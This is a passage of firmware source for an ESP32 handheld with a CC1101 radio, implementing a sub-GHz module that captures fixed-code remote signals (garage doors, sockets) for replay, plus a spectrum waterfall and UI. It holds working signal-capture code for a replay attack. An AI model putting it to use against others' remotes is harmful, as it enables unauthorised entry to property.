// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD SubGHz Attack Modules Implementation
// CC1101 Signal Capture & Replay with RMT Hardware Timing
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "subghz_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "spi_manager.h"
#include "icon.h"
#include "skull_bg.h"
#include <EEPROM.h>
#include <arduinoFFT.h>

// ═══════════════════════════════════════════════════════════════════════════
// CC1101 PA MODULE CONTROL (E07-433M20S)
// TX_EN HIGH + RX_EN LOW = transmit | TX_EN LOW + RX_EN HIGH = receive
// Both LOW = idle/shutdown | NEVER both HIGH
// ═══════════════════════════════════════════════════════════════════════════

// One-time PA module pin initialization — called automatically by cc1101PaSet*
// E32R28T/E32R35T have E07-433M20S soldered on: MUST force cc1101_pa_module true
// Without pinMode(OUTPUT), digitalWrite has NO effect — RF switch stays disconnected
static bool cc1101PaPinsReady = false;

static void cc1101PaEnsurePins() {
    // Force E32R boards BEFORE early return — user can't disable what's soldered on
    #if defined(CYD_E32R28T) || defined(CYD_E32R35T)
    cc1101_pa_module = true;
    #endif
    if (cc1101PaPinsReady) return;
    #if defined(CC1101_TX_EN) && defined(CC1101_RX_EN)
    if (cc1101_pa_module) {
        pinMode(CC1101_TX_EN, OUTPUT);
        pinMode(CC1101_RX_EN, OUTPUT);
        digitalWrite(CC1101_TX_EN, LOW);
        digitalWrite(CC1101_RX_EN, LOW);
        cc1101PaPinsReady = true;
        #if CYD_DEBUG
        Serial.printf("[CC1101] PA pins set OUTPUT (TX_EN=%d RX_EN=%d)\n", CC1101_TX_EN, CC1101_RX_EN);
        #endif
    }
    #endif
}

static void cc1101PaSetTx() {
    cc1101PaEnsurePins();
    #if defined(CC1101_TX_EN) && defined(CC1101_RX_EN)
    if (cc1101_pa_module) {
        digitalWrite(CC1101_RX_EN, LOW);
        delayMicroseconds(2);
        digitalWrite(CC1101_TX_EN, HIGH);
    }
    #endif
    ELECHOUSE_cc1101.SetTx();
}

static void cc1101PaSetRx() {
    cc1101PaEnsurePins();
    #if defined(CC1101_TX_EN) && defined(CC1101_RX_EN)
    if (cc1101_pa_module) {
        digitalWrite(CC1101_TX_EN, LOW);
        delayMicroseconds(2);
        digitalWrite(CC1101_RX_EN, HIGH);
    }
    #endif
    ELECHOUSE_cc1101.SetRx();
}

static void cc1101PaSetIdle() {
    cc1101PaEnsurePins();
    ELECHOUSE_cc1101.setSidle();
    #if defined(CC1101_TX_EN) && defined(CC1101_RX_EN)
    if (cc1101_pa_module) {
        digitalWrite(CC1101_TX_EN, LOW);
        digitalWrite(CC1101_RX_EN, LOW);
    }
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// REPLAY ATTACK IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace ReplayAttack {

// ═══════════════════════════════════════════════════════════════════════════
// RMT PROTOCOL TIMING STRUCTURES
// ═══════════════════════════════════════════════════════════════════════════

struct RCProtocol {
    uint16_t pulseLength;      // Base pulse length in microseconds
    uint8_t syncHigh, syncLow; // Sync pulse ratios
    uint8_t zeroHigh, zeroLow; // Zero bit ratios
    uint8_t oneHigh, oneLow;   // One bit ratios
    bool inverted;             // Invert logic levels
};

// Protocol lookup table - matches RCSwitch library
static const RCProtocol rcProtocols[] = {
    // Proto 0: Invalid/placeholder
    { 0, 0, 0, 0, 0, 0, 0, false },
    // Proto 1: PT2262, EV1527 (most common - garage doors, remotes)
    { 350, 1, 31, 1, 3, 3, 1, false },
    // Proto 2: KlikAanKlikUit
    { 650, 1, 10, 1, 2, 2, 1, false },
    // Proto 3: Tri-state remotes
    { 100, 30, 71, 4, 11, 9, 6, false },
    // Proto 4: Intertechno
    { 380, 1, 6, 1, 3, 3, 1, false },
    // Proto 5: TPI/I-C sockets
    { 500, 6, 14, 1, 2, 2, 1, false },
    // Proto 6: HT6P20B, Conrad RSL (inverted)
    { 450, 23, 1, 1, 2, 2, 1, true },
    // Proto 7: HS2303-PT
    { 150, 2, 62, 1, 6, 6, 1, false },
    // Proto 8:
    { 200, 3, 130, 7, 16, 3, 16, false },
    // Proto 9: (inverted)
    { 200, 130, 7, 16, 7, 16, 3, true },
    // Proto 10: Brennenstuhl (inverted)
    { 365, 18, 1, 3, 1, 1, 3, true },
    // Proto 11: (inverted)
    { 270, 36, 1, 1, 2, 2, 1, true },
    // Proto 12: (inverted)
    { 320, 36, 1, 1, 2, 2, 1, true },
};
static const int NUM_RC_PROTOCOLS = sizeof(rcProtocols) / sizeof(rcProtocols[0]);

// RMT symbol buffer for TX
#define RMT_MAX_SYMBOLS 128
static rmt_item32_t rmtSymbols[RMT_MAX_SYMBOLS];
static bool rmtInitialized = false;

// RMT RX for signal capture — PRIMARY decoder (replaces RCSwitch interrupt)
// RMT hardware captures exact pulse timing at 1μs resolution from GDO0
// Avoids RCSwitch interrupt issues on ESP32 (missed edges, ISR jitter)
#define RMT_RX_CHANNEL    RMT_CHANNEL_1
#define RMT_RX_BUF_SIZE   4096
#define RMT_CLK_DIV       80    // 80MHz/80 = 1MHz (1 tick = 1us)
static RingbufHandle_t rmtRxRingBuf = NULL;
static bool rmtRxInitialized = false;

// RMT RX reads from GDO0 (async serial data pin) — must pause before TX, resume after
// GDO0 carries demodulated OOK data in async serial mode (confirmed by Flipper Zero + Bruce)
static void pauseRmtRx() {
    if (rmtRxInitialized) {
        rmt_rx_stop(RMT_RX_CHANNEL);
        rmt_driver_uninstall(RMT_RX_CHANNEL);
        rmtRxInitialized = false;
        rmtRxRingBuf = NULL;
    }
}

// Forward declaration — initRmtRx defined below
static bool initRmtRx();

static void resumeRmtRx() {
    // Uninstall TX RMT if it was used — TX idle drives pin LOW, blocks receive
    if (rmtInitialized) {
        rmt_driver_uninstall(RMT_CHANNEL_0);
        rmtInitialized = false;
    }
    // Uninstall RX RMT — must uninstall before re-init or driver_install fails
    if (rmtRxInitialized) {
        rmt_driver_uninstall(RMT_RX_CHANNEL);
    }
    rmtRxInitialized = false;
    rmtRxRingBuf = NULL;
    initRmtRx();
}

// Initialize RMT RX on GDO0 for hardware-timed signal capture
// RMT captures exact pulse timing at 1μs resolution — no ISR jitter, no missed edges
// Ring buffer collects frames; main loop decodes via decodeRmtSignal()
static bool initRmtRx() {
    if (rmtRxInitialized) return true;

    // Ensure TX RMT is gone — can't have TX and RX on same pin simultaneously
    if (rmtInitialized) {
        rmt_driver_uninstall(RMT_CHANNEL_0);
        rmtInitialized = false;
    }

    pinMode(CC1101_GDO0, INPUT);

    rmt_config_t rxConfig = {};
    rxConfig.rmt_mode = RMT_MODE_RX;
    rxConfig.channel = RMT_RX_CHANNEL;
    rxConfig.gpio_num = (gpio_num_t)CC1101_GDO0;
    rxConfig.clk_div = RMT_CLK_DIV;             // 80 → 1μs per tick
    rxConfig.mem_block_num = 4;                   // 4 x 64 = 256 items hardware buffer
    rxConfig.rx_config.idle_threshold = 5000;     // 5ms idle = end of frame (OOK noise has gaps)
    rxConfig.rx_config.filter_en = true;
    rxConfig.rx_config.filter_ticks_thresh = 100; // Reject pulses < 100μs (noise)

    esp_err_t err = rmt_config(&rxConfig);
    if (err != ESP_OK) {
        Serial.printf("[RMT-RX] Config failed: %d\n", err);
        return false;
    }

    err = rmt_driver_install(RMT_RX_CHANNEL, 4096, 0);  // 4KB ring buffer
    if (err != ESP_OK) {
        Serial.printf("[RMT-RX] Driver install failed: %d\n", err);
        return false;
    }

    rmt_get_ringbuf_handle(RMT_RX_CHANNEL, &rmtRxRingBuf);
    rmt_rx_start(RMT_RX_CHANNEL, true);

    rmtRxInitialized = true;
    Serial.printf("[RMT-RX] Started on GPIO%d CH%d (idle=5ms filter=100us)\n",
                  CC1101_GDO0, RMT_RX_CHANNEL);
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// FREQUENCY LIST
// ═══════════════════════════════════════════════════════════════════════════

static const uint32_t frequencyList[] = {
    300000000, 303875000, 304250000, 310000000, 315000000, 318000000,
    390000000, 418000000, 433075000, 433420000, 433920000, 434420000,
    434775000, 438900000, 868350000, 915000000, 925000000
};
static const int frequencyCount = sizeof(frequencyList) / sizeof(frequencyList[0]);

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static bool exitRequested = false;
static int currentFreqIndex = 10;  // Default to 433.920 MHz

// Captured signal
static RCSwitch rcSwitch;
static bool signalCaptured = false;
static unsigned long capturedValue = 0;
static int capturedBitLength = 0;
static int capturedProtocol = 0;

// Raw capture buffer — stores exact RMT pulse timing for non-protocol signals
// Used when decodeRmtSignal() fails but frame is large enough to be a real signal
// Enables capture + replay of ANY fixed-code remote regardless of encoding scheme
#define RAW_CAPTURE_MAX 256
static rmt_item32_t rawCaptureItems[RAW_CAPTURE_MAX];
static int rawCaptureLen = 0;
static bool isRawCapture = false;

// Repeat validation — require same decoded value twice before accepting
// Real remotes send 3-5 repetitions; noise never repeats the same decode
static unsigned long pendingValue = 0;
static int pendingBits = 0;
static int pendingProto = 0;
static unsigned long pendingTime = 0;

// RSSI thresholds for capture quality gating
// Noise floor is typically -88 to -102 dBm (confirmed via serial)
// Real remotes at usable range are -30 to -70 dBm
#define CAPTURE_RSSI_THRESHOLD -75   // Protocol decode: RSSI must exceed this
#define RAW_RSSI_THRESHOLD     -65   // Raw capture: needs stronger signal (no protocol validation)
#define PENDING_EXPIRE_MS      2000  // Discard unconfirmed pending decode after 2s

// Auto-scan
static bool autoScanEnabled = false;
static int autoScanIndex = 0;
static unsigned long autoScanLastChange = 0;
static bool autoScanPaused = false;
static unsigned long autoScanPauseTime = 0;
#define AUTO_SCAN_DWELL_MS 100
#define AUTO_SCAN_RSSI_THRESHOLD -60
#define AUTO_SCAN_PAUSE_MS 2000

// UI state
static bool statusBlink = false;     // Pulsing status toggle
static bool transmitting = false;    // True during TX

// Keyboard state (for custom profile naming)
static bool kbActive = false;
static int kbMode = 0;  // 0=lower, 1=upper, 2=symbols
static bool kbCursorState = false;
static unsigned long kbLastCursorToggle = 0;
static char kbInputBuf[16] = "";
static int kbInputLen = 0;

// Sentinel characters for special keys
#define RA_KB_SHIFT '\x01'
#define RA_KB_SPACE '\x02'
#define RA_KB_BKSP  '\x03'

static const char* raKbLower[] = {
    "1234567890",
    "qwertyuiop",
    "asdfghjkl\x01",
    "zxcvbnm-\x02\x03"
};
static const char* raKbUpper[] = {
    "1234567890",
    "QWERTYUIOP",
    "ASDFGHJKL\x01",
    "ZXCVBNM-\x02\x03"
};
static const char* raKbSymbols[] = {
    "!@#$%^&*()",
    "_-.+=:;'\"~",
    "/\\|<>?[],\x01",
    "`{}\x02\x03"
};
static const char** raKbLayout = raKbLower;

static const int raKbKeyW = SCALE_W(22);
static const int raKbKeyH = SCALE_H(18);
static const int raKbKeySp = 2;

// Profiles
#define EEPROM_SIZE 4096  // Expanded for raw capture profiles (~836 bytes each)
#define EEPROM_PROFILE_START 100
#define EEPROM_PROFILE_COUNT_ADDR 96   // was 0 — COLLIDED with Settings magic at addr 0!
static int profileCount = 0;

// ═══════════════════════════════════════════════════════════════════════════
// FFT WATERFALL VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

#define FFT_SAMPLES_SUB 256
#define FFT_FREQUENCY_SUB 5000
static const unsigned long sampling_period_sub = round(1000000.0 / FFT_FREQUENCY_SUB);

static double vRealSUB[FFT_SAMPLES_SUB];
static double vImagSUB[FFT_SAMPLES_SUB];
static ArduinoFFT<double> FFTSUB = ArduinoFFT<double>();

// Waterfall Y positions — shifts down when capture panel is visible
#define HEADER_END_Y      SCALE_Y(92)
#define CAPTURE_PANEL_Y   SCALE_Y(95)
#define CAPTURE_PANEL_H   SCALE_Y(65)
#define CAPTURE_PANEL_END_Y (CAPTURE_PANEL_Y + CAPTURE_PANEL_H)
#define WATERFALL_Y_NO_CAP (HEADER_END_Y + 3)
#define WATERFALL_Y_CAP    (CAPTURE_PANEL_END_Y + 3)

static byte palette_red[128], palette_green[128], palette_blue[128];
static double attenuation_sub = 10;
static unsigned int epoch_sub = 0;
static bool paletteInitialized = false;

// Initialize color palette - HALEHOUND CYBERPUNK (matches packet monitor)
static void initPalette() {
    if (paletteInitialized) return;

    // Stage 1 (0-31): Black → Deep Purple (emerging from darkness)
    for (int i = 0; i < 32; i++) {
        palette_red[i] = (i * 15) / 31;
        palette_green[i] = 0;
        palette_blue[i] = (i * 20) / 31;
    }
    // Stage 2 (32-63): Deep Purple → Electric Blue (the glow begins)
    for (int i = 32; i < 64; i++) {
        int t = i - 32;
        palette_red[i] = 15 - (t * 15) / 31;
        palette_green[i] = (t * 31) / 31;
        palette_blue[i] = 20 + (t * 11) / 31;
    }
    // Stage 3 (64-95): Electric Blue → Hot Pink (MAXIMUM POP)
    for (int i = 64; i < 96; i++) {
        int t = i - 64;
        palette_red[i] = (t * 31) / 31;
        palette_green[i] = 31 - (t * 31) / 31;
        palette_blue[i] = 31;
    }
    // Stage 4 (96-127): Hot Pink → White (blowout at peak)
    for (int i = 96; i < 128; i++) {
        int t = i - 96;
        palette_red[i] = 31;
        palette_green[i] = (t * 63) / 31;
        palette_blue[i] = 31;
    }

    paletteInitialized = true;
}

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE FFT ENGINE
// Core 0: RSSI sampling + FFT compute (CPU-intensive, ~51ms per frame)
// Core 1: Waterfall drawing + touch/buttons + auto-scan
// CC1101 SPI access protected by mutex (both cores need it)
// ═══════════════════════════════════════════════════════════════════════════

static SemaphoreHandle_t cc1101Mtx = NULL;
static TaskHandle_t fftTaskHandle = NULL;
static volatile bool fftTaskRunning = false;

// Shared FFT result buffer — Core 0 writes, Core 1 reads
#define FFT_LINE_WIDTH (SCREEN_WIDTH / 2)  // half of screen width
static volatile int* fftKValues = nullptr;
static volatile int fftMaxK = 0;
static volatile bool fftFrameReady = false;

static inline bool cc1101Lock(TickType_t timeout = pdMS_TO_TICKS(100)) {
    return cc1101Mtx && xSemaphoreTake(cc1101Mtx, timeout) == pdTRUE;
}
static inline void cc1101Unlock() {
    if (cc1101Mtx) xSemaphoreGive(cc1101Mtx);
}

// Core 0 FFT task — samples RSSI + computes FFT, stores results for Core 1 to draw
static void fftTask(void* param) {
    fftTaskRunning = true;

    while (!exitRequested && initialized) {
        // Wait for previous frame to be drawn before overwriting
        if (fftFrameReady) {
            vTaskDelay(pdMS_TO_TICKS(5));
            continue;
        }

        #define ALPHA_TASK 0.2f
        float ewmaRSSI = -50;

        // Acquire CC1101 mutex for RSSI sampling (~51ms)
        if (!cc1101Lock(pdMS_TO_TICKS(200))) {
            vTaskDelay(pdMS_TO_TICKS(10));
            continue;
        }

        unsigned long microseconds = micros();
        for (int i = 0; i < FFT_SAMPLES_SUB; i++) {
            int rssi = ELECHOUSE_cc1101.getRssi();
            rssi += 100;
            ewmaRSSI = (ALPHA_TASK * rssi) + ((1 - ALPHA_TASK) * ewmaRSSI);
            vRealSUB[i] = ewmaRSSI * 2;
            vImagSUB[i] = 1;
            while (micros() - microseconds < sampling_period_sub) { }
            microseconds += sampling_period_sub;
        }

        cc1101Unlock();  // Release CC1101 — FFT compute doesn't need SPI

        // DC offset removal
        double mean = 0;
        for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) mean += vRealSUB[i];
        mean /= FFT_SAMPLES_SUB;
        for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) vRealSUB[i] -= mean;

        // FFT compute
        FFTSUB.windowing(vRealSUB, FFT_SAMPLES_SUB, FFTWindow::Hamming, FFTDirection::Forward);
        FFTSUB.compute(vRealSUB, vImagSUB, FFT_SAMPLES_SUB, FFTDirection::Forward);
        FFTSUB.complexToMagnitude(vRealSUB, vImagSUB, FFT_SAMPLES_SUB);

        // Compute k-values for each pixel position
        const unsigned int half_width = FFT_LINE_WIDTH;
        float scale = (float)half_width / (float)(FFT_SAMPLES_SUB >> 1);
        int maxK = 0;

        for (int j = 0; j < (int)half_width; j++) {
            int fft_idx = (int)(j / scale);
            if (fft_idx >= (FFT_SAMPLES_SUB >> 1)) fft_idx = (FFT_SAMPLES_SUB >> 1) - 1;
            int k = vRealSUB[fft_idx] / attenuation_sub;
            if (k > maxK) maxK = k;
            if (k > 127) k = 127;
            if (k < 0) k = 0;
            fftKValues[j] = k;
        }

        fftMaxK = maxK;
        fftFrameReady = true;

        vTaskDelay(1);
    }

    fftTaskRunning = false;
    vTaskDelete(NULL);
}

static void startFFTTask() {
    if (fftTaskHandle != NULL) return;
    if (cc1101Mtx == NULL) cc1101Mtx = xSemaphoreCreateMutex();
    xTaskCreatePinnedToCore(fftTask, "fftSample", 8192, NULL, 1, &fftTaskHandle, 0);
}

static void stopFFTTask() {
    // exitRequested already set by caller — task checks it
    if (fftTaskHandle == NULL) return;

    unsigned long start = millis();
    while (fftTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    if (fftTaskRunning) {
        vTaskDelete(fftTaskHandle);
    }

    fftTaskHandle = NULL;
    fftTaskRunning = false;
}

// Core 1: Draw one waterfall line from shared FFT buffer
static void drawWaterfallLine() {
    if (!fftFrameReady) return;

    const unsigned int center_x = SCREEN_WIDTH / 2;
    const unsigned int half_width = FFT_LINE_WIDTH;
    const unsigned int waterfall_y = signalCaptured ? WATERFALL_Y_CAP : WATERFALL_Y_NO_CAP;
    const unsigned int waterfall_height = SCREEN_HEIGHT - waterfall_y - 5;

    // Right side waterfall
    for (int j = 0; j < (int)half_width; j++) {
        int k = fftKValues[j];
        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x + j, epoch_sub + waterfall_y, color);
    }

    // Left side waterfall (mirrored)
    for (int j = 0; j < (int)half_width; j++) {
        int k = fftKValues[j];
        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x - j - 1, epoch_sub + waterfall_y, color);
    }

    // Auto-scale attenuation
    double tattenuation = fftMaxK / 127.0;
    if (tattenuation > attenuation_sub) {
        attenuation_sub = tattenuation;
    }

    // Advance waterfall row
    epoch_sub++;
    if (epoch_sub >= waterfall_height) {
        epoch_sub = 0;
    }

    fftFrameReady = false;
}

// Legacy single-threaded FFT (kept for reference, replaced by fftTask + drawWaterfallLine)
static void doSamplingFFT() {
    unsigned long microseconds = micros();

    #define ALPHA_SUB 0.2
    float ewmaRSSI = -50;

    // Sample RSSI from CC1101
    for (int i = 0; i < FFT_SAMPLES_SUB; i++) {
        int rssi = ELECHOUSE_cc1101.getRssi();
        rssi += 100;  // Shift to positive range

        ewmaRSSI = (ALPHA_SUB * rssi) + ((1 - ALPHA_SUB) * ewmaRSSI);

        vRealSUB[i] = ewmaRSSI * 2;
        vImagSUB[i] = 1;

        while (micros() - microseconds < sampling_period_sub) {
            // Busy wait for precise timing
        }
        microseconds += sampling_period_sub;
    }

    // Remove DC offset
    double mean = 0;
    for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) {
        mean += vRealSUB[i];
    }
    mean /= FFT_SAMPLES_SUB;
    for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) {
        vRealSUB[i] -= mean;
    }

    // Perform FFT (old-style API matching original ESP32-DIV)
    FFTSUB.windowing(vRealSUB, FFT_SAMPLES_SUB, FFTWindow::Hamming, FFTDirection::Forward);
    FFTSUB.compute(vRealSUB, vImagSUB, FFT_SAMPLES_SUB, FFTDirection::Forward);
    FFTSUB.complexToMagnitude(vRealSUB, vImagSUB, FFT_SAMPLES_SUB);

    // ═══════════════════════════════════════════════════════════════════════
    // WATERFALL DISPLAY - Centered, mirrored from middle of screen
    // ═══════════════════════════════════════════════════════════════════════

    const unsigned int center_x = SCREEN_WIDTH / 2;
    const unsigned int half_width = min((int)(FFT_SAMPLES_SUB >> 1), (int)center_x);
    const unsigned int waterfall_y = signalCaptured ? WATERFALL_Y_CAP : WATERFALL_Y_NO_CAP;
    const unsigned int waterfall_height = SCREEN_HEIGHT - waterfall_y - 5;

    int max_k = 0;
    float scale = (float)half_width / (float)(FFT_SAMPLES_SUB >> 1);

    // Right side waterfall
    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES_SUB >> 1)) fft_idx = (FFT_SAMPLES_SUB >> 1) - 1;

        int k = vRealSUB[fft_idx] / attenuation_sub;
        if (k > max_k) max_k = k;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x + j, epoch_sub + waterfall_y, color);
    }

    // Left side waterfall (mirrored)
    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES_SUB >> 1)) fft_idx = (FFT_SAMPLES_SUB >> 1) - 1;

        int k = vRealSUB[fft_idx] / attenuation_sub;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x - j - 1, epoch_sub + waterfall_y, color);
    }

    // Auto-scale attenuation
    double tattenuation = max_k / 127.0;
    if (tattenuation > attenuation_sub) {
        attenuation_sub = tattenuation;
    }

    // Advance waterfall row
    epoch_sub++;
    if (epoch_sub >= waterfall_height) {
        epoch_sub = 0;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

// Forward declarations (defined below after icon bar config)
static void drawHeaderStatic();
static void drawHeader();
static void drawReplayUI();

static void updateDisplay() {
    // Draw full header (title, status, mode frame)
    drawHeader();

    // Tune CC1101 (mutex protects from Core 0 FFT sampling)
    if (cc1101Lock(pdMS_TO_TICKS(60))) {
        cc1101PaSetIdle();
        if (autoScanEnabled) {
            ELECHOUSE_cc1101.setMHZ(frequencyList[autoScanIndex] / 1000000.0);
        } else {
            ELECHOUSE_cc1101.setMHZ(frequencyList[currentFreqIndex] / 1000000.0);
        }
        cc1101PaSetRx();
        cc1101Unlock();
    }

    // Refresh icon bar highlights
    drawReplayUI();
}

// ═══════════════════════════════════════════════════════════════════════════
// HEADER — Split into static (drawn once) and dynamic (updates only changed areas)
// ═══════════════════════════════════════════════════════════════════════════

// Draw-once parts: title, watermark, frame borders, separator
static void drawHeaderStatic() {
    // Clear header area once
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, HEADER_END_Y - CONTENT_Y_START, TFT_BLACK);

    // Skull watermark behind header (subtle dark cyan)
    tft.drawBitmap(SCALE_X(180), SCALE_Y(40), bitmap_icon_skull_subghz, 16, 16, tft.color565(0, 30, 40));

    // Nosifer glitch title — never changes, draw once
    drawGlitchText(SCALE_Y(55), "REPLAY", &Nosifer_Regular10pt7b);

    // Mode frame borders — static, only interior changes
    int frameX = 5;
    int frameY = SCALE_Y(74);
    int frameW = GRAPH_PADDED_W;
    int frameH = SCALE_H(16);
    tft.drawRoundRect(frameX, frameY, frameW, frameH, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(frameX + 1, frameY + 1, frameW - 2, frameH - 2, 2, HALEHOUND_GUNMETAL);

    // Bottom separator
    tft.drawLine(0, HEADER_END_Y, SCREEN_WIDTH, HEADER_END_Y, HALEHOUND_HOTPINK);
}

// Dynamic parts: status text + freq/RSSI inside frame — selective clear only
static void drawHeader() {
    // --- Status line: clear just the status text row ---
    int statusY = SCALE_Y(63);
    tft.fillRect(0, statusY, SCREEN_WIDTH, 12, TFT_BLACK);

    tft.setTextSize(1);
    if (transmitting) {
        statusBlink = !statusBlink;
        uint16_t sc = statusBlink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
        tft.setTextColor(sc, TFT_BLACK);
        int sw = 8 * 6;
        tft.setCursor((SCREEN_WIDTH - sw) / 2, SCALE_Y(65));
        tft.print(">> TX <<");
    } else if (signalCaptured) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        int sw = 14 * 6;
        tft.setCursor((SCREEN_WIDTH - sw) / 2, SCALE_Y(65));
        tft.print(">> CAPTURED <<");
    } else if (autoScanEnabled) {
        statusBlink = !statusBlink;
        uint16_t sc = statusBlink ? HALEHOUND_HOTPINK : HALEHOUND_CYAN;
        tft.setTextColor(sc, TFT_BLACK);
        int sw = 14 * 6;
        tft.setCursor((SCREEN_WIDTH - sw) / 2, SCALE_Y(65));
        tft.print(">> SCANNING <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        int sw = 8 * 6;
        tft.setCursor((SCREEN_WIDTH - sw) / 2, SCALE_Y(65));
        tft.print("- IDLE -");
    }

    // --- Mode frame interior: clear just the inside ---
    int frameX = 5;
    int frameY = SCALE_Y(74);
    int frameW = GRAPH_PADDED_W;
    int frameH = SCALE_H(16);
    tft.fillRect(frameX + 3, frameY + 3, frameW - 6, frameH - 6, TFT_BLACK);

    // Frequency (left side of frame)
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.setCursor(frameX + 5, frameY + 4);
    if (autoScanEnabled) {
        tft.print(frequencyList[autoScanIndex] / 1000000.0, 3);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.print(" SCAN");
    } else {
        tft.print(frequencyList[currentFreqIndex] / 1000000.0, 3);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.print(" MHz");
    }

    // RSSI (right side of frame)
    int rssi = -99;
    if (cc1101Lock(pdMS_TO_TICKS(30))) {
        rssi = ELECHOUSE_cc1101.getRssi();
        cc1101Unlock();
    }
    tft.setCursor(SCALE_X(160), frameY + 4);
    tft.setTextColor(rssi > -60 ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET, TFT_BLACK);
    tft.printf("RSSI:%d", rssi);
}

// Icon bar configuration — 6 icons: Back | Scan | Prev | Next | Replay | Save
#define RA_ICON_SIZE 16
#define RA_ICON_NUM 6
static int raIconX[RA_ICON_NUM] = {10, SCALE_X(55), SCALE_X(95), SCALE_X(135), SCALE_X(175), SCALE_X(215)};
static const unsigned char* raIcons[RA_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back (exit)
    bitmap_icon_scanner,           // 1: SCAN toggle
    bitmap_icon_sort_down_minus,   // 2: Prev freq
    bitmap_icon_sort_up_plus,      // 3: Next freq
    bitmap_icon_flash,             // 4: REPLAY (transmit)
    bitmap_icon_floppy             // 5: SAVE (profiles)
};

// Draw icon bar with state-aware highlighting
static void drawReplayUI() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < RA_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        // SCAN icon: HOTPINK when scanning
        if (i == 1 && autoScanEnabled) color = HALEHOUND_HOTPINK;
        // Icon 2: CLEAR (bright) when signal captured, otherwise freq- (dimmed during scan)
        if (i == 2 && signalCaptured) color = HALEHOUND_HOTPINK;
        else if ((i == 2 || i == 3) && autoScanEnabled) color = HALEHOUND_GUNMETAL;
        // REPLAY icon: HOTPINK during TX
        if (i == 4 && transmitting) color = HALEHOUND_HOTPINK;
        // SAVE icon: HOTPINK when signal captured
        if (i == 5 && signalCaptured) color = HALEHOUND_HOTPINK;
        const unsigned char* icon = raIcons[i];
        if (i == 2 && signalCaptured) icon = bitmap_icon_no_signal;  // CLEAR icon
        tft.drawBitmap(raIconX[i], ICON_BAR_Y, icon, RA_ICON_SIZE, RA_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// Forward declarations for profile menu (defined after loop())
void showProfileMenu();  // Non-static — also called from SubGHz submenu
static void drawProfileMenu();

static void drawUI() {
    // Skull splatter watermark — full screen behind everything
    tft.drawBitmap(0, 0, skull_bg_bitmap, SKULL_BG_WIDTH, SKULL_BG_HEIGHT, 0x0041);

    // Draw static header parts (title, watermark, frame borders) — once
    drawHeaderStatic();

    // Draw dynamic header parts (status, freq/RSSI)
    drawHeader();
}

static void drawSignalCaptured() {
    int panelX = SCALE_X(10);
    int panelY = CAPTURE_PANEL_Y;
    int panelW = CONTENT_INNER_W;
    int panelH = CAPTURE_PANEL_H;

    // Flash effect on capture — brief hotpink flash, then clear to black
    tft.fillRect(panelX, panelY, panelW, panelH, HALEHOUND_HOTPINK);
    delay(50);
    tft.fillRect(panelX, panelY, panelW, panelH, TFT_BLACK);

    // Double rounded rect border (drawn over waterfall)
    tft.drawRoundRect(panelX, panelY, panelW, panelH, 4, HALEHOUND_HOTPINK);
    tft.drawRoundRect(panelX + 1, panelY + 1, panelW - 2, panelH - 2, 3, HALEHOUND_MAGENTA);

    // Text uses TFT_BLACK background to be readable over waterfall
    tft.setTextSize(1);

    if (isRawCapture) {
        // RAW CAPTURE display
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(panelX + SCALE_X(25), panelY + 6);
        tft.print(">> RAW CAPTURE <<");

        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.setCursor(panelX + 8, panelY + 20);
        tft.printf("%d items captured", rawCaptureLen);

        // First 3 pulse durations
        tft.setTextColor(HALEHOUND_CYAN, TFT_BLACK);
        tft.setCursor(panelX + 8, panelY + 33);
        if (rawCaptureLen >= 3) {
            tft.printf("%u/%u  %u/%u  %u/%u",
                       rawCaptureItems[0].duration0, rawCaptureItems[0].duration1,
